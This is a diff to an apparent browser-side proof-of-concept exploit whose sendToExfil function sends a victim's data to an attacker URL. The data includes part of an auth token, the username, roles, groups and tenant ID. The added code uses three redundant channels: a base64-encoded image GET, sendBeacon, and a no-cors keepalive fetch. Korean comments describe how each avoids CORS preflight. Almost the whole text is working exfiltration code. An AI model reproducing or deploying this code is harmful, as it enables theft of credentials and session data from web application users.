@@ -98,22 +98,40 @@
   function sendToExfil(payload) {
     if (!EXFIL_URL) return;
 
-    // sendBeacon — CORS preflight 없이 전송 (text/plain)
+    // 방법 1: GET with query param (가장 확실)
     try {
-      var sent = navigator.sendBeacon(EXFIL_URL, JSON.stringify(payload));
-      console.log('[PoC] sendBeacon: ' + (sent ? 'OK' : 'FAILED'));
+      var mini = {
+        t: (payload.token || '').substring(0, 20),
+        u: payload.username,
+        r: payload.roles,
+        g: payload.groups,
+        tid: payload.tenantId,
+        ts: payload.timestamp
+      };
+      var img = new Image();
+      img.src = EXFIL_URL + '/' + encodeURIComponent(btoa(JSON.stringify(mini)));
+      console.log('[PoC] GET image sent');
     } catch (e) {
-      console.log('[PoC] sendBeacon error: ' + e.message);
+      console.log('[PoC] GET image error: ' + e.message);
     }
 
-    // fetch no-cors 백업
+    // 방법 2: sendBeacon (text/plain, no preflight)
+    try {
+      var blob = new Blob([JSON.stringify(payload)], { type: 'text/plain' });
+      var sent = navigator.sendBeacon(EXFIL_URL, blob);
+      console.log('[PoC] sendBeacon: ' + (sent ? 'OK' : 'FAILED'));
+    } catch (e) {}
+
+    // 방법 3: fetch keepalive
     try {
       fetch(EXFIL_URL, {
         method: 'POST',
         mode: 'no-cors',
+        keepalive: true,
+        headers: { 'Content-Type': 'text/plain' },
         body: JSON.stringify(payload)
       });
-      console.log('[PoC] fetch no-cors sent');
+      console.log('[PoC] fetch sent');
     } catch (e) {}
   }
 
